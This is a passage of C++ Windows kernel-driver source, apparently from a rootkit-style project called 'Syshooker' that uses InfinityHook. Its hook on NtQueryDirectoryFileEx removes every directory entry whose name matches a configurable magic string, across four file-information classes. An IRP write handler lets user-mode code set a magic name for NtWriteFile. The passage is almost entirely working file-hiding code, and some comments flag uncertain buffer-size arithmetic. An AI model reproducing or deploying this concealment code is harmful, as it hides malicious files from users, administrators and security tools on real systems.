			PFILE_ID_FULL_DIR_INFORMATION FileInformationPtr = (PFILE_ID_FULL_DIR_INFORMATION)FileInformation;
			PFILE_ID_FULL_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_ID_FULL_DIR_INFORMATION)FileInformation; // necessary for hiding the last file

			while (1) {
				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
				}
				kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
				if (wcsstr(FileNameBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
					// Not the last one
					if (FileInformationPtr->NextEntryOffset > 0) {
						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer

						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
						PFILE_ID_FULL_DIR_INFORMATION TempFileInformationPtr = (PFILE_ID_FULL_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
						ULONG FileInformationBufferSizeToEnd = 0;
						while (TempFileInformationPtr->NextEntryOffset != 0) {
							FileInformationBufferSizeToEnd += TempFileInformationPtr->NextEntryOffset;
							TempFileInformationPtr = (PFILE_ID_FULL_DIR_INFORMATION)((PUINT8)TempFileInformationPtr + TempFileInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
						}
						// last record size (with filename)
						FileInformationBufferSizeToEnd += sizeof(FILE_ID_FULL_DIR_INFORMATION) + TempFileInformationPtr->FileNameLength; // off by one?

						// next structure address - start copying from there
						PFILE_ID_FULL_DIR_INFORMATION NextFileInformationStructAddr = (PFILE_ID_FULL_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);

						memcpy(FileInformationPtr, NextFileInformationStructAddr, FileInformationBufferSizeToEnd);

						continue; // handle the same structure address next (because it was moved)
					}

					// Last one
					else {
						// set previous NextEntryOffset to 0
						PreviousFileInformationPtr->NextEntryOffset = 0;

						// erease this FileInformation structure
						memset(FileInformationPtr, 0, sizeof(FILE_ID_FULL_DIR_INFORMATION) + FileInformationPtr->FileNameLength);
						break;
					}
				}

				if (FileInformationPtr->NextEntryOffset == 0) break;
				else {
					PreviousFileInformationPtr = FileInformationPtr;
					// Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
					FileInformationPtr = (PFILE_ID_FULL_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
				}
			}
		}
		else if (FileInformationClass == 50) {
			PFILE_ID_GLOBAL_TX_DIR_INFORMATION FileInformationPtr = (PFILE_ID_GLOBAL_TX_DIR_INFORMATION)FileInformation;
			PFILE_ID_GLOBAL_TX_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_ID_GLOBAL_TX_DIR_INFORMATION)FileInformation; // necessary for hiding the last file

			while (1) {
				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
				}
				kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
				if (wcsstr(FileNameBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
					// Not the last one
					if (FileInformationPtr->NextEntryOffset > 0) {
						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer

						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
						PFILE_ID_GLOBAL_TX_DIR_INFORMATION TempFileInformationPtr = (PFILE_ID_GLOBAL_TX_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
						ULONG FileInformationBufferSizeToEnd = 0;
						while (TempFileInformationPtr->NextEntryOffset != 0) {
							FileInformationBufferSizeToEnd += TempFileInformationPtr->NextEntryOffset;
							TempFileInformationPtr = (PFILE_ID_GLOBAL_TX_DIR_INFORMATION)((PUINT8)TempFileInformationPtr + TempFileInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
						}
						// last record size (with filename)
						FileInformationBufferSizeToEnd += sizeof(FILE_ID_GLOBAL_TX_DIR_INFORMATION) + TempFileInformationPtr->FileNameLength; // off by one?

						// next structure address - start copying from there
						PFILE_ID_GLOBAL_TX_DIR_INFORMATION NextFileInformationStructAddr = (PFILE_ID_GLOBAL_TX_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);

						memcpy(FileInformationPtr, NextFileInformationStructAddr, FileInformationBufferSizeToEnd);

						continue; // handle the same structure address next (because it was moved)
					}

					// Last one
					else {
						// set previous NextEntryOffset to 0
						PreviousFileInformationPtr->NextEntryOffset = 0;

						// erease this FileInformation structure
						memset(FileInformationPtr, 0, sizeof(FILE_ID_GLOBAL_TX_DIR_INFORMATION) + FileInformationPtr->FileNameLength);
						break;
					}
				}

				if (FileInformationPtr->NextEntryOffset == 0) break;
				else {
					PreviousFileInformationPtr = FileInformationPtr;
					// Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
					FileInformationPtr = (PFILE_ID_GLOBAL_TX_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
				}
			}
		}
		else if (FileInformationClass == 60) {
			PFILE_ID_EXTD_DIR_INFORMATION FileInformationPtr = (PFILE_ID_EXTD_DIR_INFORMATION)FileInformation;
			PFILE_ID_EXTD_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_ID_EXTD_DIR_INFORMATION)FileInformation; // necessary for hiding the last file

			while (1) {
				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
				}
				kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
				if (wcsstr(FileNameBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
					// Not the last one
					if (FileInformationPtr->NextEntryOffset > 0) {
						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer

						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
						PFILE_ID_EXTD_DIR_INFORMATION TempFileInformationPtr = (PFILE_ID_EXTD_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
						ULONG FileInformationBufferSizeToEnd = 0;
						while (TempFileInformationPtr->NextEntryOffset != 0) {
							FileInformationBufferSizeToEnd += TempFileInformationPtr->NextEntryOffset;
							TempFileInformationPtr = (PFILE_ID_EXTD_DIR_INFORMATION)((PUINT8)TempFileInformationPtr + TempFileInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
						}
						// last record size (with filename)
						FileInformationBufferSizeToEnd += sizeof(FILE_ID_EXTD_DIR_INFORMATION) + TempFileInformationPtr->FileNameLength; // off by one?

						// next structure address - start copying from there
						PFILE_ID_EXTD_DIR_INFORMATION NextFileInformationStructAddr = (PFILE_ID_EXTD_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);

						memcpy(FileInformationPtr, NextFileInformationStructAddr, FileInformationBufferSizeToEnd);

						continue; // handle the same structure address next (because it was moved)
					}

					// Last one
					else {
						// set previous NextEntryOffset to 0
						PreviousFileInformationPtr->NextEntryOffset = 0;

						// erease this FileInformation structure
						memset(FileInformationPtr, 0, sizeof(FILE_ID_EXTD_DIR_INFORMATION) + FileInformationPtr->FileNameLength);
						break;
					}
				}

				if (FileInformationPtr->NextEntryOffset == 0) break;
				else {
					PreviousFileInformationPtr = FileInformationPtr;
					// Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
					FileInformationPtr = (PFILE_ID_EXTD_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
				}
			}
		}
		else if (FileInformationClass == 63) {
			PFILE_ID_EXTD_BOTH_DIR_INFORMATION FileInformationPtr = (PFILE_ID_EXTD_BOTH_DIR_INFORMATION)FileInformation;
			PFILE_ID_EXTD_BOTH_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_ID_EXTD_BOTH_DIR_INFORMATION)FileInformation; // necessary for hiding the last file

			while (1) {
				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
				}
				kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
				if (wcsstr(FileNameBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
					// Not the last one
					if (FileInformationPtr->NextEntryOffset > 0) {
						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer

						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
						PFILE_ID_EXTD_BOTH_DIR_INFORMATION TempFileInformationPtr = (PFILE_ID_EXTD_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
						ULONG FileInformationBufferSizeToEnd = 0;
						while (TempFileInformationPtr->NextEntryOffset != 0) {
							FileInformationBufferSizeToEnd += TempFileInformationPtr->NextEntryOffset;
							TempFileInformationPtr = (PFILE_ID_EXTD_BOTH_DIR_INFORMATION)((PUINT8)TempFileInformationPtr + TempFileInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
						}
						// last record size (with filename)
						FileInformationBufferSizeToEnd += sizeof(FILE_ID_EXTD_BOTH_DIR_INFORMATION) + TempFileInformationPtr->FileNameLength; // off by one?

						// next structure address - start copying from there
						PFILE_ID_EXTD_BOTH_DIR_INFORMATION NextFileInformationStructAddr = (PFILE_ID_EXTD_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);

						memcpy(FileInformationPtr, NextFileInformationStructAddr, FileInformationBufferSizeToEnd);

						continue; // handle the same structure address next (because it was moved)
					}

					// Last one
					else {
						// set previous NextEntryOffset to 0
						PreviousFileInformationPtr->NextEntryOffset = 0;

						// erease this FileInformation structure
						memset(FileInformationPtr, 0, sizeof(FILE_ID_EXTD_BOTH_DIR_INFORMATION) + FileInformationPtr->FileNameLength);
						break;
					}
				}

				if (FileInformationPtr->NextEntryOffset == 0) break;
				else {
					PreviousFileInformationPtr = FileInformationPtr;
					// Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
					FileInformationPtr = (PFILE_ID_EXTD_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
				}
			}
		}
	}
	return OriginalStatus;
}

NTSTATUS SyshookerCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS SyshookerWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	NTSTATUS status = STATUS_SUCCESS; // initially define status as success
	ULONG_PTR information = 0; // used bytes to return back to client

	// get stack location of IRP
	PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);

	do {
		if (irpSp->Parameters.Write.Length < sizeof(WriteHookData)) {
			status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		// make data buffer accessible as ThreadData pointer
		WriteHookData* data = static_cast<WriteHookData*>(Irp->UserBuffer);

		// check nullptr and valid values
		if (data == nullptr || data->BufferLength <= 0 || data->BufferLength > MAX_PATH_SYSHOOKER) {
			if (data != nullptr)
				KdPrint(("BufferLength is probably wrong (%d). (0x%08X)\n", data->BufferLength, status));

			status = STATUS_INVALID_PARAMETER;
			break;
		}

		// print the buffer in kernel
		kprintf("[+] infinityhook: Syshooker IRP Write: %ws.\n", data->NameBuffer);
		if (wcscpy_s(Settings.NtWriteFileMagicName, MAX_PATH_SYSHOOKER, data->NameBuffer) != 0) {
			status = STATUS_INVALID_PARAMETER;
		}
		

		// return data used
		information = sizeof(*data);
	} while (FALSE);

	// complete IRP
	Irp->IoStatus.Status = status; // whatever status that is currently set
	Irp->IoStatus.Information = information;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}